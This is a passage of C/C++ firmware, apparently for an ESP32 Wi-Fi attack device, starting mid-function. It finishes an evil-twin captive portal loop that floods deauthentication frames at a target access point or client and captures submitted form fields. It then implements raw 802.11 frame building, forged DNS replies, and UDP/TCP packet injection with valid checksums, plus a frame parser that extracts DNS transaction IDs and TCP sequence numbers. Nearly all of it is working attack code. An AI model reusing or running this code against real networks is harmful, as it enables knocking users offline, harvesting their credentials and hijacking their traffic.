        Serial.println("[PORTAL] deauth off: the twin is not on the target channel");
    }
    if (deauthOn) { memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); }

    Serial.printf(
        "[PORTAL] '%s' on ch%d at %s for %lums (redirect=%s dns=%d deauth=%d)\n",
        ssid.c_str(),
        (int)apChannel,
        stats.ip.c_str(),
        (unsigned long)duration,
        cfg.redirect.length() > 0 ? cfg.redirect.c_str() : "none",
        portalDns != nullptr ? 1 : 0,
        deauthOn ? 1 : 0
    );

    uint32_t start = millis();
    uint32_t deadline = start + duration;
    uint32_t lastDeauth = millis();
    uint32_t lastDraw = 0;
    // "All devices" deauths broadcast; a picked client is hit on its own so the
    // rest of the AP is left alone.
    const uint8_t *deauthTarget = cfg.hasTargetClient ? cfg.targetClient : _default_target;

    if (cfg.draw) portal_draw_screen(cfg, apChannel, 0, 0);

    while ((int32_t)(deadline - millis()) > 0) {
        if (portalDns != nullptr) portalDns->processNextRequest();

        if (deauthOn && (millis() - lastDeauth) >= 250) {
            stats.deauthFrames += portal_deauth_burst(cfg.targetBssid, apChannel, deauthTarget);
            lastDeauth = millis();
        }

        if (cfg.draw && (millis() - lastDraw) >= 500) {
            lastDraw = millis();
            portal_draw_screen(cfg, apChannel, millis() - start, stats.deauthFrames);
        }

        if (EscPress) break;
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    stats.clients = WiFi.softAPgetStationNum();
    stats.elapsedMs = millis() - start;

    // Always tear down, however the loop ended.
    if (portalDns != nullptr) {
        portalDns->stop();
        delete portalDns;
        portalDns = nullptr;
    }
    if (portalServer != nullptr) {
        portalServer->end();
        vTaskDelay(pdMS_TO_TICKS(50));
        delete portalServer;
        portalServer = nullptr;
    }
    WiFi.softAPdisconnect(true);
    wifi_complete_cleanup(false);
    portalPage = "";
    portalRedirect = "";

    stats.requests = portalRequests;
    stats.fieldSets = portalFieldSets;
    stats.lastFields = portalLastFields;
    stats.ok = true;
    Serial.printf(
        "[PORTAL] stopped after %lums: %lu requests, %d clients, %lu deauth frames\n",
        (unsigned long)stats.elapsedMs,
        (unsigned long)stats.requests,
        stats.clients,
        (unsigned long)stats.deauthFrames
    );
    return stats;
}

// ============================================================================
// Application layer injection: DNS replies and raw UDP / TCP payloads.
//
// Frames are built by hand (802.11 header -> LLC/SNAP -> IPv4 -> UDP/TCP ->
// payload) and transmitted with wifi_raw_inject(), so the whole stack is under
// script control. Checksums are computed for real: a receiver drops a TCP
// segment with a bad checksum even when everything else matches.
//
// The scratch buffers are static rather than on the stack because the JS task
// carries a 1500 byte frame of its own already.
// ============================================================================

#define WIFI_L4_HEADER_ROOM (24 + 8 + 20 + 20) // 802.11 + LLC/SNAP + IPv4 + TCP

static uint8_t l4Packet[WIFI_RAW_MAX_FRAME + 8];
static uint8_t l4Frame[WIFI_RAW_MAX_FRAME + 8];
static uint16_t l4IpId = 0;
static uint8_t l4SeqNum = 0;

static void l3_put_u16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8);
    p[1] = (uint8_t)(v & 0xFF);
}

static void l3_put_u32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24);
    p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);
    p[3] = (uint8_t)v;
}

// Running 16-bit ones-complement sum, fed with network order data.
static uint32_t l4_partial_sum(const uint8_t *data, size_t len, uint32_t acc) {
    size_t i = 0;
    for (; i + 1 < len; i += 2) acc += ((uint16_t)data[i] << 8) | data[i + 1];
    if (i < len) acc += (uint16_t)data[i] << 8;
    return acc;
}

static uint16_t l4_finish(uint32_t acc) {
    while (acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
    return (uint16_t)(~acc);
}

static uint32_t l4_pseudo_sum(uint32_t srcIp, uint32_t dstIp, uint8_t proto, uint16_t l4Len) {
    uint32_t acc = l4_partial_sum((const uint8_t *)&srcIp, 4, 0);
    acc = l4_partial_sum((const uint8_t *)&dstIp, 4, acc);
    acc += proto;
    acc += l4Len;
    return acc;
}

// 802.11 data frame from the AP (FromDS=1): addr1 = station, addr2/3 = BSSID.
static size_t build_data_frame(
    uint8_t *out, size_t cap, const uint8_t dst[6], const uint8_t bssid[6], const uint8_t *payload, size_t len
) {
    if (cap < 32 + len) return 0;

    out[0] = 0x08; // frame control: data
    out[1] = 0x02; // flags: FromDS
    out[2] = 0x00; // duration
    out[3] = 0x00;
    memcpy(out + 4, dst, 6);   // addr1 receiver
    memcpy(out + 10, bssid, 6); // addr2 transmitter
    memcpy(out + 16, bssid, 6); // addr3 source
    out[22] = (uint8_t)(l4SeqNum << 4);
    out[23] = 0x00;

    static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00}; // RFC1042 / IPv4
    memcpy(out + 24, snap, 8);
    memcpy(out + 32, payload, len);
    return 32 + len;
}

static size_t build_ipv4_udp(
    uint8_t *out, size_t cap, uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort,
    const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 8 + payloadLen;
    size_t total = 20 + l4Len;
    if (cap < total) return 0;

    out[0] = 0x45;
    out[1] = 0x00;
    l3_put_u16(out + 2, (uint16_t)total);
    l3_put_u16(out + 4, ++l4IpId);
    l3_put_u16(out + 6, 0x0000);
    out[8] = 64;
    out[9] = 17; // UDP
    l3_put_u16(out + 10, 0);
    l3_put_u32(out + 12, srcIp);
    l3_put_u32(out + 16, dstIp);
    l3_put_u16(out + 10, l4_finish(l4_partial_sum(out, 20, 0)));

    uint8_t *udp = out + 20;
    l3_put_u16(udp, srcPort);
    l3_put_u16(udp + 2, dstPort);
    l3_put_u16(udp + 4, (uint16_t)l4Len);
    l3_put_u16(udp + 6, 0);
    memcpy(udp + 8, payload, payloadLen);

    uint32_t acc = l4_pseudo_sum(srcIp, dstIp, 17, (uint16_t)l4Len);
    acc = l4_partial_sum(udp, l4Len, acc);
    uint16_t sum = l4_finish(acc);
    l3_put_u16(udp + 6, sum == 0 ? 0xFFFF : sum);
    return total;
}

static size_t build_ipv4_tcp(
    uint8_t *out, size_t cap, uint32_t srcIp, uint32_t dstIp, uint16_t srcPort, uint16_t dstPort, uint32_t seq,
    uint32_t ack, uint8_t flags, const uint8_t *payload, size_t payloadLen
) {
    size_t l4Len = 20 + payloadLen;
    size_t total = 20 + l4Len;
    if (cap < total) return 0;

    out[0] = 0x45;
    out[1] = 0x00;
    l3_put_u16(out + 2, (uint16_t)total);
    l3_put_u16(out + 4, ++l4IpId);
    l3_put_u16(out + 6, 0x4000); // don't fragment
    out[8] = 64;
    out[9] = 6; // TCP
    l3_put_u16(out + 10, 0);
    l3_put_u32(out + 12, srcIp);
    l3_put_u32(out + 16, dstIp);
    l3_put_u16(out + 10, l4_finish(l4_partial_sum(out, 20, 0)));

    uint8_t *tcp = out + 20;
    l3_put_u16(tcp, srcPort);
    l3_put_u16(tcp + 2, dstPort);
    l3_put_u32(tcp + 4, seq);
    l3_put_u32(tcp + 8, ack);
    tcp[12] = 0x50; // data offset 5 words, no options
    tcp[13] = flags;
    l3_put_u16(tcp + 14, 64240);
    l3_put_u16(tcp + 16, 0);
    l3_put_u16(tcp + 18, 0);
    memcpy(tcp + 20, payload, payloadLen);

    uint32_t acc = l4_pseudo_sum(srcIp, dstIp, 6, (uint16_t)l4Len);
    acc = l4_partial_sum(tcp, l4Len, acc);
    l3_put_u16(tcp + 16, l4_finish(acc));
    return total;
}

size_t wifi_build_dns_response(
    uint8_t *out, size_t cap, uint16_t txid, const char *domain, const char *answerIp, uint32_t ttl
) {
    if (out == NULL || domain == NULL || answerIp == NULL) return 0;

    uint8_t answer[4];
    int octets[4] = {0, 0, 0, 0};
    int field = 0, digits = 0;
    for (const char *p = answerIp; *p != '\0'; p++) {
        if (*p == '.') {
            if (digits == 0 || field >= 3) return 0;
            field++;
            digits = 0;
            continue;
        }
        if (*p < '0' || *p > '9' || digits >= 3) return 0;
        octets[field] = octets[field] * 10 + (*p - '0');
        if (octets[field] > 255) return 0;
        digits++;
    }
    if (field != 3 || digits == 0) return 0;
    for (int i = 0; i < 4; i++) answer[i] = (uint8_t)octets[i];

    // Header: response, recursion available, one question, one answer.
    size_t pos = 0;
    if (cap < 12) return 0;
    l3_put_u16(out, txid);
    l3_put_u16(out + 2, 0x8180);
    l3_put_u16(out + 4, 1);
    l3_put_u16(out + 6, 1);
    l3_put_u16(out + 8, 0);
    l3_put_u16(out + 10, 0);
    pos = 12;

    const char *label = domain;
    while (*label != '\0') {
        const char *dot = strchr(label, '.');
        size_t labelLen = (dot != NULL) ? (size_t)(dot - label) : strlen(label);
        if (labelLen == 0 || labelLen > 63) return 0;
        if (pos + 1 + labelLen + 5 > cap) return 0;
        out[pos++] = (uint8_t)labelLen;
        memcpy(out + pos, label, labelLen);
        pos += labelLen;
        if (dot == NULL) break;
        label = dot + 1;
    }
    out[pos++] = 0x00;

    l3_put_u16(out + pos, 1); // QTYPE A
    l3_put_u16(out + pos + 2, 1); // QCLASS IN
    pos += 4;

    if (pos + 16 > cap) return 0;
    out[pos++] = 0xC0; // name pointer to the question
    out[pos++] = 0x0C;
    l3_put_u16(out + pos, 1);
    l3_put_u16(out + pos + 2, 1);
    l3_put_u32(out + pos + 4, ttl);
    pos += 8;
    l3_put_u16(out + pos, 4);
    pos += 2;
    memcpy(out + pos, answer, 4);
    pos += 4;
    return pos;
}

WifiL4Result wifi_inject_udp(
    const uint8_t dstMac[6], const uint8_t bssid[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort,
    uint16_t dstPort, const uint8_t *payload, size_t payloadLen, uint8_t channel, uint8_t repeat, uint32_t gapMs
) {
    WifiL4Result res = {};
    res.channel = channel;

    if (payload == NULL || payloadLen == 0) {
        res.error = "payload is empty";
        return res;
    }
    if (payloadLen > WIFI_L4_MAX_PAYLOAD) {
        res.error = "payload too large (max 1400 bytes)";
        return res;
    }

    size_t packetLen = build_ipv4_udp(l4Packet, sizeof(l4Packet), srcIp, dstIp, srcPort, dstPort, payload, payloadLen);
    if (packetLen == 0) {
        res.error = "failed to build the IP packet";
        return res;
    }

    l4SeqNum = (uint8_t)(l4SeqNum + 1);
    size_t frameLen = build_data_frame(l4Frame, sizeof(l4Frame), dstMac, bssid, l4Packet, packetLen);
    if (frameLen == 0) {
        res.error = "frame too large";
        return res;
    }

    res.payloadLen = (int)payloadLen;
    res.len = (int)frameLen;

    // Deliberately no cleanlyStopWebUiForWiFiFeature() here: scripts may send
    // hundreds of these and wifi_raw_inject() already brings the radio up.
    WifiRawTxResult tx = wifi_raw_inject(l4Frame, frameLen, channel, repeat, -1, false, gapMs);
    res.ok = tx.ok;
    res.frames = tx.sent;
    res.error = tx.error;
    return res;
}

WifiL4Result wifi_inject_tcp(
    const uint8_t dstMac[6], const uint8_t bssid[6], uint32_t srcIp, uint32_t dstIp, uint16_t srcPort,
    uint16_t dstPort, uint32_t seq, uint32_t ack, uint8_t flags, const uint8_t *payload, size_t payloadLen,
    uint8_t channel, uint8_t repeat, uint32_t gapMs
) {
    WifiL4Result res = {};
    res.channel = channel;

    if (payload == NULL || payloadLen == 0) {
        res.error = "payload is empty";
        return res;
    }
    if (payloadLen > WIFI_L4_MAX_PAYLOAD) {
        res.error = "payload too large (max 1400 bytes)";
        return res;
    }

    size_t packetLen =
        build_ipv4_tcp(l4Packet, sizeof(l4Packet), srcIp, dstIp, srcPort, dstPort, seq, ack, flags, payload, payloadLen);
    if (packetLen == 0) {
        res.error = "failed to build the IP packet";
        return res;
    }

    l4SeqNum = (uint8_t)(l4SeqNum + 1);
    size_t frameLen = build_data_frame(l4Frame, sizeof(l4Frame), dstMac, bssid, l4Packet, packetLen);
    if (frameLen == 0) {
        res.error = "frame too large";
        return res;
    }

    res.payloadLen = (int)payloadLen;
    res.len = (int)frameLen;

    WifiRawTxResult tx = wifi_raw_inject(l4Frame, frameLen, channel, repeat, -1, false, gapMs);
    res.ok = tx.ok;
    res.frames = tx.sent;
    res.error = tx.error;
    return res;
}

// Decodes a dotted quad. Used by the JS layer for srcIp / dstIp / answerIp.
bool wifi_parse_ipv4(const char *s, uint32_t *out) {
    if (s == NULL || out == NULL) return false;
    uint32_t value = 0;
    int field = 0, digits = 0, octet = 0;
    for (const char *p = s; *p != '\0'; p++) {
        if (*p == '.') {
            if (digits == 0 || field >= 3) return false;
            value = (value << 8) | (uint32_t)octet;
            field++;
            digits = 0;
            octet = 0;
            continue;
        }
        if (*p < '0' || *p > '9' || digits >= 3) return false;
        octet = octet * 10 + (*p - '0');
        if (octet > 255) return false;
        digits++;
    }
    if (field != 3 || digits == 0) return false;
    *out = (value << 8) | (uint32_t)octet;
    return true;
}

bool wifi_parse_frame(const uint8_t *frame, size_t len, WifiParsedFrame *out) {
    if (out == NULL) return false;
    memset(out, 0, sizeof(*out));

    if (frame == NULL || len < 10) {
        out->error = "frame too short to be 802.11";
        return false;
    }

    uint16_t fc = (uint16_t)(frame[0] | (frame[1] << 8));
    out->type = (uint8_t)((fc >> 2) & 0x03);
    out->subtype = (uint8_t)((fc >> 4) & 0x0F);
    out->protectedFrame = (fc & 0x4000) != 0;
    out->toDs = (fc & 0x0100) != 0;
    out->fromDs = (fc & 0x0200) != 0;

    if (len < 24) {
        out->error = "truncated 802.11 header";
        return false;
    }
    memcpy(out->addr1, frame + 4, 6);
    memcpy(out->addr2, frame + 10, 6);
    memcpy(out->addr3, frame + 16, 6);

    if (out->type != 2) { // management / control frames stop here
        out->valid = true;
        return true;
    }

    size_t hdr = 24;
    if (out->subtype & 0x08) hdr += 2; // QoS data
    if (out->toDs && out->fromDs) hdr += 6; // WDS

    if (out->protectedFrame) {
        out->error = "protected frame (WPA/WPA2): payload is encrypted";
        return false;
    }
    if (len < hdr + 8) {
        out->error = "no LLC/SNAP header";
        return false;
    }
    if (frame[hdr] != 0xAA || frame[hdr + 1] != 0xAA || frame[hdr + 2] != 0x03) {
        out->error = "payload is not LLC/SNAP (IP traffic)";
        return false;
    }

    size_t pos = hdr + 8;
    if (len < pos + 20) {
        out->error = "no IPv4 header";
        return false;
    }
    const uint8_t *ip = frame + pos;
    size_t ihl = (size_t)(ip[0] & 0x0F) * 4;
    if ((ip[0] >> 4) != 4 || ihl < 20 || ip[9] == 0) {
        out->error = "not an IPv4 packet";
        return false;
    }

    out->hasIp = true;
    out->ipProto = ip[9];
    out->ipTotalLen = (uint16_t)((ip[2] << 8) | ip[3]);
    out->ipSrc = ((uint32_t)ip[12] << 24) | ((uint32_t)ip[13] << 16) | ((uint32_t)ip[14] << 8) | ip[15];
    out->ipDst = ((uint32_t)ip[16] << 24) | ((uint32_t)ip[17] << 16) | ((uint32_t)ip[18] << 8) | ip[19];

    size_t l4pos = pos + ihl;
    size_t l4avail = len - l4pos;

    if (out->ipProto == 17 && l4avail >= 8) {
        const uint8_t *udp = frame + l4pos;
        out->hasUdp = true;
        out->udpSrcPort = (uint16_t)((udp[0] << 8) | udp[1]);
        out->udpDstPort = (uint16_t)((udp[2] << 8) | udp[3]);

        size_t dnsLen = l4avail - 8;
        const uint8_t *dns = udp + 8;
        if ((out->udpSrcPort == 53 || out->udpDstPort == 53) && dnsLen >= 12) {
            out->hasDns = true;
            out->dnsTxId = (uint16_t)((dns[0] << 8) | dns[1]);
            out->dnsIsResponse = (dns[2] & 0x80) != 0;
            uint16_t qdCount = (uint16_t)((dns[4] << 8) | dns[5]);
            if (qdCount > 0) {
                size_t q = 12;
                size_t nameLen = 0;
                while (q < dnsLen && dns[q] != 0) {
                    uint8_t labelLen = dns[q];
                    if ((labelLen & 0xC0) != 0) break; // compression pointer
                    q++;
                    for (uint8_t i = 0; i < labelLen && q < dnsLen; i++) {
                        char c = (char)dns[q++];
                        if (nameLen < sizeof(out->dnsQName) - 2) {
                            if (c >= 'A' && c <= 'Z') c = (char)(c - 'A' + 'a');
                            out->dnsQName[nameLen++] = c;
                        }
                    }
                    if (nameLen < sizeof(out->dnsQName) - 2) out->dnsQName[nameLen++] = '.';
                }
                if (nameLen > 0 && out->dnsQName[nameLen - 1] == '.') nameLen--;
                out->dnsQName[nameLen] = '\0';
                if (q + 5 <= dnsLen) {
                    out->dnsQType = (uint16_t)((dns[q + 1] << 8) | dns[q + 2]);
                    out->dnsQClass = (uint16_t)((dns[q + 3] << 8) | dns[q + 4]);
                }
            }
        }
    } else if (out->ipProto == 6 && l4avail >= 20) {
        const uint8_t *tcp = frame + l4pos;
        out->hasTcp = true;
        out->tcpSrcPort = (uint16_t)((tcp[0] << 8) | tcp[1]);
        out->tcpDstPort = (uint16_t)((tcp[2] << 8) | tcp[3]);
        out->tcpSeq = ((uint32_t)tcp[4] << 24) | ((uint32_t)tcp[5] << 16) | ((uint32_t)tcp[6] << 8) | tcp[7];
        out->tcpAck = ((uint32_t)tcp[8] << 24) | ((uint32_t)tcp[9] << 16) | ((uint32_t)tcp[10] << 8) | tcp[11];
        out->tcpFlags = tcp[13];
    }

    out->valid = true;
    return true;
}
